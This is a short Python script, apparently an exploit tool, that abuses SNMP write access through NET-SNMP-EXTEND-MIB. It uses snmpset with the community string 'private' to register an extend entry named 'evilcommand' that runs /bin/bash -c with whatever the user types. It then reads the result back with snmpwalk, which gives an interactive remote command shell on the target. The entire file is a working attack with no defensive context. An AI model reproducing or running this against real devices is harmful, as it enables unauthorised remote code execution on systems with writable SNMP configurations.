import subprocess
import os

ip = "127.0.0.1"
com_string = "private"
version = "2c"
snmpset = "/usr/bin/snmpset"
snmpwalk = "/usr/bin/snmpwalk"

delimiters = {"start": """NET-SNMP-EXTEND-MIB::nsExtendOutputFull."evilcommand" = STRING: """,
"end": """NET-SNMP-EXTEND-MIB::nsExtendOutNumLines"""}

while 1:
    text = input("Command : ")
    if not text.strip():
        continue
    cmd = text.strip()

    os.system("""{} -m +NET-SNMP-EXTEND-MIB -v {} -c {} {} 'nsExtendStatus."evilcommand"' = destroy > /dev/null""".format(snmpset, version, com_string, ip))
    os.system("""{} -m +NET-SNMP-EXTEND-MIB -v {} -c {} {} 'nsExtendStatus."evilcommand"'  = createAndGo 'nsExtendCommand."evilcommand"' = /bin/bash 'nsExtendArgs."evilcommand"' = "-c \\\"{}\\\"" > /dev/null""".format(snmpset, version, com_string, ip, cmd))
    output = os.system("""{} -v {} -c {} {} NET-SNMP-EXTEND-MIB::nsExtendObjects > /tmp/snmprce""".format(snmpwalk, version, com_string, ip))

    with open('/tmp/snmprce', 'r') as file:
        final = ""
        flag = False
        for line in file.readlines():
            if delimiters["start"] in line:
                flag = True
                final += line.replace(delimiters["start"], '')
                continue
            elif flag:
                if delimiters["end"] in line:
                    break
                else:
                    final += line
        print(final)
